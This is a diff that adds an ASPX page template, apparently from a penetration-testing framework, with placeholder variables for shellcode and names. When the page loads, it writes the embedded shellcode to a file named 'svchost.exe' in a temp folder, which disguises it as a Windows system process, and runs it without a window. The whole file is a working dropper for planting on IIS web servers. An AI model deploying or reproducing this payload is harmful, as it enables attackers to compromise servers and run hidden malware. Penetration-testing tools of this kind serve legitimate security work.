@@ -1,0 +1,34 @@
+<%@ Page Language="C#" AutoEventWireup="true" %>
+<%@ Import Namespace="System.IO" %>
+<script runat="server">
+	protected void Page_Load(object sender, EventArgs e)
+	{
+		StringBuilder %{var_file} = new StringBuilder();
+		%{var_file}.Append("\x%{exe[0].to_s(16)}%{shellcode}");
+		string %{var_tempdir} = Path.GetTempPath();
+		string %{var_basedir} = Path.Combine(%{var_tempdir}, "%{var_filename}");
+		string %{var_tempexe} = Path.Combine(%{var_basedir}, "svchost.exe");
+		
+		Directory.CreateDirectory(%{var_basedir});
+		
+		FileStream fs = File.Create(%{var_tempexe});
+		
+		try
+		{
+			foreach (char %{var_iterator} in %{var_file}.ToString())
+			{
+				fs.WriteByte(Convert.ToByte(%{var_iterator}));
+			}
+		}
+		finally
+		{
+			if (fs != null) ((IDisposable)fs).Dispose();
+		}
+
+		System.Diagnostics.Process %{var_proc} = new System.Diagnostics.Process();
+		%{var_proc}.StartInfo.CreateNoWindow = true;
+		%{var_proc}.StartInfo.UseShellExecute = true;
+		%{var_proc}.StartInfo.FileName = %{var_tempexe};
+		%{var_proc}.Start();
+	}
+</script>
